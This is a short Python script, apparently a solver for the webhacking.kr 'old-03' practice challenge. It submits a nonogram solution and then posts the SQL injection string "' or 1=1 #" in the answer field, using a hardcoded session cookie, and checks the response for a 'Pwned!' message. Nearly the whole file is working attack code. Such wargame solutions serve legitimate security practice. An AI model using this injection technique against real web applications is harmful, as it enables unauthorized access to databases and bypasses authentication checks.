import requests

url = "https://webhacking.kr/challenge/web-03/index.php"
cookies = {"PHPSESSID":"dl93hcctm9huohuq699p2sivon"}

def nonogram():
    payload = "?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111"
    res = requests.get(url=url+payload, cookies=cookies)
    if "Clear!" in res.text:
        print("Nonogram Clear!")

def nonogram_log():
    payload = {"answer":"\' or 1=1 #", "id":"a"}
    res = requests.post(url, data=payload, cookies=cookies)
    if "old-03 Pwned!" in res.text:
        print("old-03 Pwned!")
    elif "already solve" in res.text:
        print("already solve")

if __name__ == "__main__":
    nonogram()
    nonogram_log()